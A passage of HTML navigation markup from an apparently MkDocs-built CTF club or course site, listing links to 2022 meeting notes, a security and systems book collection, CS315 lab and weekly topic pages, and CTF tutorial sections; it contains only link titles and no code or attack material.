      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-08-11
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-08/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-09-08
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-15/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-09-15
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-22/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-09-22
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-09-30/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-09-30
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-10-06
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-10-13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-10-13
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-11-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-11-11
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-12-22/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-12-22
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Book Collection
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Book Collection
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/CTF%20Competition%20Starter%20Guide/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Competition Starter Guide
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/From%200%20to%201%20The%20CTFer%20Growth%20Path/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    From 0 to 1: The CTFer Growth Path
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3" >
        
          
          <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Computer and System
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_3">
            <span class="md-nav__icon md-icon"></span>
            Computer and System
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Android%20Dalvik%20virtual%20machine%20structure%20and%20mechanism%20anatomy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Android Dalvik virtual machine structure and mechanism analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Android%20Internals/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Android Internals: Power User's View
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Android%20system%20source%20code%20scenario%20analysis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Android System Source Code Scenario Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Code/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Code: The Hidden Language of Computer Hardware and Software
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Computer%20Systems/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Computer Systems: A Programmer's Perspective
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Linux%20Kernel%20Development/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux Kernel Development
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Mac%20OS%20X%20and%20iOS%20Internals/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mac OS X and iOS Internals: To the Appleâ€™s Core
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Understanding%20the%20Linux%20Kernel/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Understanding the Linux Kernel
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Windows%20Internals/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Windows Internals
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/Code%20Reveal/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Code Reveal
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Computer%20and%20System/In-depth%20understanding%20of%20Android%20kernel%20design%20ideas/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    In-depth understanding of Android kernel design ideas
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4" >
        
          
          <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Cryptography
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_4">
            <span class="md-nav__icon md-icon"></span>
            Cryptography
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Cryptography/Foundations%20of%20Cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Foundations of Cryptography
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Cryptography/Introduction%20to%20Modern%20Cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Introduction to Modern Cryptography: Principles and Protocols
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Cryptography/Understanding%20Cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Understanding Cryptography: A Textbook for Students and Practitioners
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Cryptography/Graphical%20cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Graphical cryptography
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5" >
        
          
          <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Network
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_5">
            <span class="md-nav__icon md-icon"></span>
            Network
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Network/Computer%20Networking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Computer Networking: A Top-Down Approach
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Network/Practical%20Packet%20Analysis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Practical Packet Analysis: Using Wireshark to Solve Real-World Network Problems
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Network/TCP%20IP%20Illustrated/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    TCP/IP Illustrated
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6" >
        
          
          <label class="md-nav__link" for="__nav_2_6" id="__nav_2_6_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Programming
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_6_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6">
            <span class="md-nav__icon md-icon"></span>
            Programming
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6_1" >
        
          
          <label class="md-nav__link" for="__nav_2_6_1" id="__nav_2_6_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    C
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_6_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6_1">
            <span class="md-nav__icon md-icon"></span>
            C
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C/C%20Primer%20Plus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C Primer Plus (Developer's Library)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C/C%20Programming%20Language/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C Programming Language, 2nd Edition
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C/C%20Traps%20and%20Pitfalls/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C Traps and Pitfalls
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C/Expert%20C%20Programming%20Deep%20C%20Secrets/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Expert C Programming: Deep C Secrets
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C/Pointers%20on%20C/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pointers on C
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_6_2" >
        
          
          <label class="md-nav__link" for="__nav_2_6_2" id="__nav_2_6_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    C++
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_6_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_6_2">
            <span class="md-nav__icon md-icon"></span>
            C++
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C%2B%2B/C%2B%2B%20Primer%20Plus/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C++ Primer Plus
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Programming/C%2B%2B/C%2B%2B%20Primer/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    C++ Primer
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_7" >
        
          
          <label class="md-nav__link" for="__nav_2_7" id="__nav_2_7_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    PWN
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_7_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_7">
            <span class="md-nav__icon md-icon"></span>
            PWN
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/PWN/Practical%20Malware%20Analysis/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Practical Malware Analysis
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/PWN/Encryption%20and%20Decryption/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Encryption and Decryption
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/PWN/Core%20Principles%20of%20Reverse%20Engineering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Core Principles of Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_8" >
        
          
          <label class="md-nav__link" for="__nav_2_8" id="__nav_2_8_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Security
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_8_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2_8">
            <span class="md-nav__icon md-icon"></span>
            Security
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Security/0day%20Security/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    0day Security: Software Vulnerability Analysis Techniques
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Security/A%20Guide%20to%20Kernel%20Exploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    A Guide to Kernel Exploitation: Attacking the Core
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Security/Fuzzing%20for%20Software%20Security%20Testing%20and%20Quality%20Assurance/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Fuzzing for Software Security Testing and Quality Assurance (Artech House Information Security and Privacy)
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Security/Gray%20Hat%20Hacking/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Gray Hat Hacking The Ethical Hackers Handbook
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Security/Rootkit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    The Rootkit Arsenal: Escape and Evasion: Escape and Evasion in the Dark Corners of the System
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Book/Security/Vulnerability%20War/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnerability War: Software Vulnerability Analysis in a Nutshell
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CS315 Material
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            CS315 Material
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Introduction/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CS315 CTF Track
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%201%20Packet%20Sniffing%20and%20Wireshark/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 1: Packet Sniffing and Wireshark
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%202%20Secure%20Coding%20and%20Buffer%20Overflows/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 2: Secure Coding and Buffer Overflows
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%203%20Secure%20Coding%20and%20Format-String%20Vulnerability/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 3: Secure Coding and Format-String Vulnerability
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%204%20Scanning%2C%20Reconnaissance%2C%20and%20Penetration%20Testing/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 4: Scanning, Reconnaissance, and Penetration Testing
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%205%20Reverse%20Engineering%20and%20Obfuscation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 5: Reverse Engineering and Obfuscation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%206%20IoT%20Security%20and%20Wireless%20Exploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 6: IoT Security and Wireless Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%207%20Forensics%20and%20Steganography%20Part%20I/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 7: Forensics and Steganography Part I
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%208%20Forensics%20and%20Steganography%20Part%20II/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 8: Forensics and Steganography Part II
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%209%20Open-Source%20Intelligence/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 9: Open-Source Intelligence
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%2010%20Public%20Key%20Cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 10: Public Key Cryptography
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lab 11: Return-to-libc &amp; Return Oriented Programming
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/Lab%2012%20Attack-with-Defense/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attack with Defense
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_14" >
        
          
          <label class="md-nav__link" for="__nav_3_14" id="__nav_3_14_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2021
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_14_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3_14">
            <span class="md-nav__icon md-icon"></span>
            2021
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Overview/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Overview
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%201/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week 1 CTF Introduction and Forensics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%202/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week 2 PWN: Basic Buffer Overflow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%203/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week3 PWN: Advanced Buffer Overflow
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%204/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week4 WEB: Information Discovery
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%205/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week5 WEB: Vulnerability Exploit
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%206/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week6 RE: De-compiling Program
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%207/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week7 WLAN: Attacking WiFi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%208/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week8 MISC: Physical Attacks
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%209/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week9 MISC: Social Engineering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%2010/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week10 PWN: Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%2011/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week11 CRYPTO: Public Key Crypto Attacking
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%2012/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week12 WEB: Attacking Websites
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%2013/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week13 PWN: ROL and ROP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Week%2014/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Week14 CTF: Attack-Defense CTF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CS315/2021/Exercise%20Solutions/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Exercise Solutions
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    CTF Basic and Tutorial
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            CTF Basic and Tutorial
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/CTF%20and%20Hacker%20Attitude/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Introduction and the Hacker Attitude
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Linux%20Basics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux OS Installation and Basics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Python_1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python Programming Quick Guide - Installation and Basic IO
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Python_2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python Programming Quick Guide - Syntax
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Python_3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python Programming Quick Guide - Functions
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Python_4/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Python Programming Quick Guide - CTF Related
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Forensics/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Forensics
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Cryptography/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Cryptography
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Web/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/RE/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Reverse Engineering
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/PWN/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Binary Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../CTF/Docker/" class="md-nav__link">
        
  
